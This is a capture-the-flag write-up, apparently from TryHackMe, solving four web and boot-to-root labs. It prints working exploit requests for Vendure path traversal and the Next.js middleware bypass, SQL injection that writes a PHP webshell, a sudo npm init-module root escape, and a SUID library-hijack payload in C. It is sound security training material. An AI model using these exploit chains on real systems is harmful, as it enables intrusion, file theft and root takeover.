Task 02 · 60 pts Web

Asset Server

The target

A storefront built on Vendure 3.0.4 (headless e-commerce). An Express frontend on port 80 reverse-proxies /assets/* to a Vendure instance on port 3001 via http-proxy-middleware. The flag lives at /flag.txt on the Vendure container, one directory above its asset root.

The bug

Vendure 3.0.4 ships the @vendure/asset-server-plugin that is vulnerable to CVE-2024-56357 — a path-traversal in the asset handler. The handler joins the request path onto its configured asset root but normalises after decoding, so URL-encoded ../ sequences escape the root unchecked.

The request

GET /assets/..%2F..%2Fflag.txt HTTP/1.1
Host: TARGET_IP

Encoding notes that matter during the solve:

  • ..%2F and %2e%2e%2f both work.
  • A literal ../ gets collapsed by the Express proxy layer before Vendure sees it, so plain traversal fails.
  • Point the request at the Express port (80), not the Vendure backend; the backend may not even be reachable from outside.

Why it works

Inside the asset-server plugin, the path is joined to the asset root after URL-decoding. By the time the normaliser runs, the .. components are already in a fully-formed OS path and resolve upward. The Express proxy layer refuses literal ../, which is why the encoded form is the one that lands.

Takeaway. Encoding bypasses survive at trust boundaries. The proxy in front of Vendure sanitises what it can parse; what it can't parse (percent-encoded path segments) rides straight through to a sink that decodes then joins.

Flag format: THM{v3ndur3_CVE_f1l3_l34k} — actual value redacted per TryHackMe policy.

Task 03 Web

Gatepass

The target

A Next.js 14.1.1 app with middleware that gates /api/* behind an auth check. The route /api/file?path=… reads a file and returns its contents, but only once the middleware is satisfied.

The bug

CVE-2025-29927 — the Next.js middleware subrequest bypass. Next.js uses the internal header x-middleware-subrequest to flag requests that originated from within the middleware itself (to avoid re-running the chain on a redirect). The flag is honoured when it arrives from an untrusted client too, so attaching the header skips the middleware entirely.

The request

GET /api/file?path=/flag.txt HTTP/1.1
Host: TARGET_IP
x-middleware-subrequest: middleware

Variants worth knowing:

  • Nested value — x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware — also lands, which is relevant when the app uses nested middleware chains.
  • The file handler blocks .. but accepts absolute paths. /flag.txt is absolute and clean, so the second-stage filter never fires.

Why it works

Next.js tracks middleware recursion by writing x-middleware-subrequest on internal fetches and short-circuiting the middleware chain when it reads the header back. The fix in later versions scopes the header to internal invocations only; the vulnerable version trusts anyone who sets it. Combined with a route handler that only guards against relative traversal, the result is unauthenticated arbitrary file read.

Takeaway. Framework-internal headers are not a security boundary unless the framework explicitly strips them from inbound requests. When you have middleware doing auth, the first thing to check is whether it can be told it has already run.

Flag format: THM{n3xt_l3v3l_byp4ss} — actual value redacted per TryHackMe policy.

Task 06 · 30 pts Boot2Root

Sequel

Target: HomeTel (Next.js on :3000, Apache on :80, SSH on :22) · three flags: web, user, root

Recon

Only three TCP ports open: 22, 80, 3000. Port 80 serves an Apache dir listing with an empty /api/bill/ folder and a phpMyAdmin 4.9.5 install (login-gated). Port 3000 is a Next.js dev build called HomeTel. The dev bundle leaks source paths like /home/ubuntu/csportal/src/pages/{login,home}/index.js and the API endpoints /api/login, /api/bill and /api/logout.

Web flag — SQL injection in /api/bill

The home page's bill-lookup form POSTs {"NumReference": "<n>"} to /api/bill. The parameter is interpolated into a numeric SQL expression without quotes or parameterisation, so no quote escape is needed:

POST /api/bill
{"NumReference":"0 UNION SELECT 1,2,3"}
=> 3-column shape confirmed: Nreference, price, tax

{"NumReference":"0 UNION SELECT version(),2,3"}
=> 8.0.36-0ubuntu0.20.04.1

{"NumReference":"0 UNION SELECT current_user(),database(),3"}
=> root@localhost, bill_app_db

{"NumReference":"0 UNION SELECT GROUP_CONCAT(table_name),2,3
                FROM information_schema.tables
                WHERE table_schema=database()"}
=> bill, flag, users

{"NumReference":"0 UNION SELECT flag,2,3 FROM bill_app_db.flag"}
=> web flag text

Side note on the login endpoint: POST /api/login returns the matching user row, but a classic ' OR '1'='1 hits an explicit "only guest login is allowed" branch that rejects multi-row responses. The bill endpoint is the real sink.

User flag — MySQL FILE → PHP webshell

The DB session is root@localhost, has FILE privilege, and @@secure_file_priv is empty. LOAD_FILE is restricted by AppArmor — /etc/passwd and /etc/mysql/my.cnf return content, but /etc/ssh/sshd_config, /home/* and /proc/mounts all return NULL — so direct file disclosure is a dead end. Writes to /var/www/html/ are allowed, however, which is enough:

POST /api/bill
{"NumReference":"0 UNION SELECT UNHEX('3c3f70687020...'),2,3
                INTO OUTFILE '/var/www/html/pwn.php'"}

The payload hex-encodes <?php system($_GET["c"]); ?>. The API response reads "User not found" because the UNION returned zero data rows, but the file still lands on disk. Confirm:

GET /pwn.php?c=id
=> uid=33(www-data) gid=33(www-data) groups=33(www-data),119(mysql)

From there, find / -name user.txt 2>/dev/null surfaces /var/www/user.txt (owned by www-data, mode 644). The .env at /home/ubuntu/csportal/.env also leaks MYSQL_PASSWORD=root@123 for the phpMyAdmin path if you want it.

Root flag — sudo npm, done right for modern npm

sudo -l as www-data returns:

(root) NOPASSWD: /usr/bin/npm *

The classic GTFOBins payload (preinstall script in a crafted package.json) does not work on npm 8+. The npm wrapper deliberately drops privileges on lifecycle scripts to the directory owner (here, www-data), even with --unsafe-perm. Confirmed with a probe: id inside preinstall returned uid=33(www-data), not root.

The reliable escape on npm 8/9/10 is the init-module userconfig trick. npm itself require()s the file named by init-module inside the npm process (which is still root), before any lifecycle isolation runs:

echo 'init-module=/tmp/init.js' > /tmp/.npmrc

cat > /tmp/init.js <<'EOF'
require("child_process").execSync(
    "cat /root/root.txt > /tmp/rf; chmod 666 /tmp/rf"
);
process.exit(0);
EOF

sudo npm init -y --userconfig=/tmp/.npmrc --prefix=/tmp/foo
cat /tmp/rf
Takeaway. The two things worth filing for next time: INTO OUTFILE lands even when the HTTP response says "User not found", because the write happens at parse/execute time, not row-return time; and GTFOBins' default npm entry is misleading on npm 8+, where init-module is the reliable route.

Flag formats: web THM{SQL_1nj3ct10n_1s_fun}, user THM{1nj3ct10n_2_RC3_1s_m0r3_fun}, root THM{sud0_gtf0b1ns_4_d4_w1n} — actual values redacted per TryHackMe policy.

Task 07 · 60 pts Boot2Root

Malscan

Target: MalScan Labs sandbox (Apache on :80, SSH on :22) · two flags: user, root

Recon

Only 22 and 80 open. / is a static "Site Under Construction" page. A directory probe finds /dev/ (301 redirect), a working MalScan Labs frontend with upload.php, about.php, contact.php and a readable assets/ listing.

Initial RCE — the sandbox is not a sandbox

/dev/upload.php accepts a multipart POST, performs an ELF magic-byte check (text files are rejected with "Error: File is not a binary."), runs the uploaded file as www-data, and renders its stdout under "Execution Output:". A YARA scan runs ahead of execution but doesn't block a plain shellcode payload.

msfvenom gives you a tight ELF whose only job is to run a shell command and let its stdout surface in the response:

msfvenom -p linux/x64/exec \
    CMD='id; uname -a; find / -name user.txt 2>/dev/null; ls -la /home' \
    -f elf -o /tmp/mal

curl -X POST http://TARGET/dev/upload.php -F "file=@/tmp/mal"

Key leaks from the first probe:

  • uid=33(www-data), hostname tryhackme-2404 (Ubuntu 24.04).
  • Two home directories: /home/agent and /home/ubuntu, both unreadable to www-data.
  • The user flag isn't under /home/* — it's at /opt/user.txt (world-readable).

SUID binary analysis — /opt/agent/scanner

find / -perm -4000 surfaces an unusual SUID binary: /opt/agent/scanner (root, mode 4755), sitting inside /opt/agent which is world-writable (drwxrwxrwx). Exfil it (via a base64 CMD payload), run objdump -d, and the control flow is textbook library-hijack bait:

// Pseudocode of main()
char buf[0x200];
readlink("/proc/self/exe", buf, 0x1ff);          // "/opt/agent/scanner"

char path[0x200];
snprintf(path, 0x200, "%s/libscan.so", dirname(buf));
                                                 // "/opt/agent/libscan.so"

void *h = dlopen(path, RTLD_NOW);
void (*fn)(void) = dlsym(h, "run");
fn();

No libscan.so ships in /opt/agent/ — a plain run of the scanner prints dlopen error: ... No such file or directory. Combine that with world-writable /opt/agent/ and the SUID bit: whoever drops /opt/agent/libscan.so gets code execution as root the next time the scanner runs.

Building the payload library on target

The library is trivial. A constructor is enough; RTLD_NOW fires it inside dlopen, well before dlsym("run") would even return:

// /tmp/libscan.c
#include <stdlib.h>
#include <unistd.h>

void run(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/root_pwn; "
           "cat /root/root.txt >> /tmp/root_pwn; "
           "chmod 666 /tmp/root_pwn");
}

__attribute__((constructor))
void ctor(void) { run(); }

The compile gotcha. The box ships gcc-13 and all the tools in /usr/libexec/gcc/x86_64-linux-gnu/13/, but the Apache child environment that executes your uploaded ELF has an empty PATH. The gcc wrapper's execvp("cc1", ...) fails with No such file or directory because cc1 isn't in the (empty) PATH and the default search paths don't include /usr/libexec. Fix by passing both -B dirs explicitly and exporting a sane PATH for the linker's own child processes:

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

gcc -B/usr/libexec/gcc/x86_64-linux-gnu/13/ \
    -B/usr/bin/ \
    -shared -fPIC \
    -o /tmp/libscan.so /tmp/libscan.c

Then plant and trigger:

cp /tmp/libscan.so /opt/agent/libscan.so
chmod 755 /opt/agent/libscan.so
/opt/agent/scanner        # SUID root loads our .so, constructor runs as root
cat /tmp/root_pwn
# => uid=0(root) gid=0(root) groups=0(root),33(www-data)
# => root flag text

All of that bundles into a single msfvenom CMD= payload if you want it as one upload.

Takeaway. A "sandbox" that advertises "passed YARA and was emulated" while actually executing the binary and streaming its stdout back is a free system() as the server user. And an SUID binary that dlopens a sibling path in a world-writable directory doesn't even need to be overwritten — the missing library is the hijack.
